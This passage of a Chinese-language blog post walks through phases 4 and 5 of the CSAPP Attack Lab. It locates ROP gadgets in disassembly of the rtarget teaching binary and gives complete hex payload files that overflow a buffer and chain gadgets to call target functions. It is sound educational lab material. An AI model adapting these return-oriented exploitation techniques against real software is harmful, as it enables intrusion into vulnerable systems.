<p>在终端运行命令 <code>objdump -d rtarget &gt; rtarget.txt</code>，以寻找目标代码。<br>现在我们要重复第二阶段的任务：将自己的 cookie 作为参数传入 <code>touch2</code>。我们需要做三步：</p>
<ol>
<li>将 cookie 传入<code>%rdi</code>中</li>
<li>将 <code>touch2</code> 地址放入栈中</li>
<li>执行 <code>touch2</code></li>
</ol>
<p>为了将 cookie 存入 <code>%rdi</code>，最简单的想法是先将 cookie 存入栈中，再从栈中弹出。但是找不到 <code>popq %rdi</code>，只找到了 <code>popq %rax</code>，代码地址为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>所以我们的第一个 <em>gadget</em> 的地址为 <code>0x4019ab</code>。</p>
<p>后面的动作可以用下面的汇编代码完成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq %rax %edi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>其中 <code>movq %rax %edi</code> 的字节码为：<code>48 89 c7 c3</code>。我们可以在下面的代码中找到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>所以我们第二个 <em>gadget</em> 的地址为 <code>0x4019c5</code>。</p>
<p>所以我们要构造的文件应该包含三部分，首先是40字节的缓冲区，然后是 <code>gadget1</code> 的地址，cookie，<code>gadget2</code> 的地址，最后是 <code>touch2</code> 的地址。构造 rtarget4.txt 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cc cc cc cc cc cc cc cc cc cc                                                                                           </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00  </span><br><span class="line">c5 19 40 00 00 00 00 00  </span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>我们先生成它的二进制码：<code>.\hex2raw &lt; rtarget4.txt &gt; rtarget4_r.txt</code>。<br>然后执行 <code>.\rtarget -i rtarget4_r.txt -q</code>，得到：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2017.13.01.png" alt="Screen Shot 2017-07-09 at 17.13.01"></p>
<p>成功。</p>
<h2 id="第五阶段"><a href="#第五阶段" class="headerlink" title="第五阶段"></a>第五阶段</h2><p>阶段五的目标和阶段三一样，首先使用 cookie 构造字符串，然后将字符串作为参数传入 <code>touch3</code>。</p>
<p>首先，我们把 cookie 转换成 ascii 码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x59b997fa -&gt; 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>

<p>我们接下来的思路为：</p>
<ol>
<li>获得 <code>%rsp</code> 的地址</li>
<li>将（栈的起始地址）+（cookie 的偏移量）放入某个寄存器中</li>
<li>将寄存器的值放入 <code>%rdi</code> 中</li>
<li>调用 <code>touch3</code></li>
</ol>
<p>首先，寻找 <code>movq %rsp, %rax</code>, <code>48 89 e0</code>。</p>
<p>我们可以找到如下代码片段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>所以 <code>gadget1</code> 的地址为 <code>0x401aad</code>。</p>
<p>接下来，我们需要递增 <code>%rax</code> 的地址，我们可以找到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>得 <code>gadget2</code> 的地址为：<code>0x4019d8</code>。</p>
<p>接下来要将 <code>%rax</code> 的内容移动到 <code>%rdi</code> 中，找到 <code>mov %rax, %rdi</code>, <code>48 89 c7</code> 的代码片段：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>得到 <code>gadget3</code> 的地址为：<code>0x4019a2</code>。</p>
<p>最后，攻击文件应该包括：填充区1，gadget1，gadget2，gadget3，touch3的地址，填充区2，cookie。第二个填充区的大小为55(0x37) - 3 * 8 = 31字节。<code>rtarget5.txt</code> 的内容为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cc cc cc cc cc cc cc cc cc cc                                                                                           </span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">cc cc cc cc cc cc cc cc cc cc</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">d8 19 40 00 00 00 00 00  </span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">dd dd dd dd dd dd dd dd dd dd</span><br><span class="line">dd dd dd dd dd dd dd dd dd dd</span><br><span class="line">dd dd dd dd dd dd dd dd dd dd</span><br><span class="line">dd</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>

<p>我们先生成它的二进制码：<code>.\hex2raw &lt; rtarget5.txt &gt; rtarget5_r.txt</code>。<br>然后执行 <code>.\rtarget -i rtarget5_r.txt -q</code>，得到：</p>
<p><img src="/images/2017-7-9/Screen%20Shot%202017-07-09%20at%2019.58.10.png" alt="Screen Shot 2017-07-09 at 19.58.10"></p>
<p>成功。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次实验真的加深了我对内存和缓冲区的理解。以前上专业课，所有的知识都停留在书本上，没有做到学以致用。而这次实验，通过汇编、反汇编的、拼凑内存内容的方式直接和操作系统底层打交道，真的很有趣，但是也很要求精确。</p>
<p>现在看看，我们平时用高级语言写与系统无关的代码是一件多么幸福的事情啊。</p>
<p>我觉得学习操作系统，阅读 CSAPP，就是让我能够站在系统工作原理的粒度上理解代码，理解 C 语言和汇编，这种思考方式和视角才是阅读 CSAPP 和完成这些实验之后，我获得的最大的收获。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Chuanlei Guo</p>
  <div class="site-description" itemprop="description">正因为未知，人与人之间的羁绊才愈发迷人</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">23</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">24</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/ChuanleiGuo" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ChuanleiGuo" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:chuanleiguo@gmail.com" title="E-Mail → mailto:chuanleiguo@gmail.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="http://weibo.com/bestchuan" title="Weibo → http:&#x2F;&#x2F;weibo.com&#x2F;bestchuan" rel="noopener" target="_blank"><i class="weibo fa-fw"></i>Weibo</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Chuanlei Guo</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

<script>
  function loadCount() {
    var d = document, s = d.createElement('script');
    s.src = 'https://chuanleiguo-com.disqus.com/count.js';
    s.id = 'dsq-count-scr';
    (d.head || d.body).appendChild(s);
  }
  // defer loading until the whole page loading is completed
  window.addEventListener('load', loadCount, false);
</script>

</body>
</html>
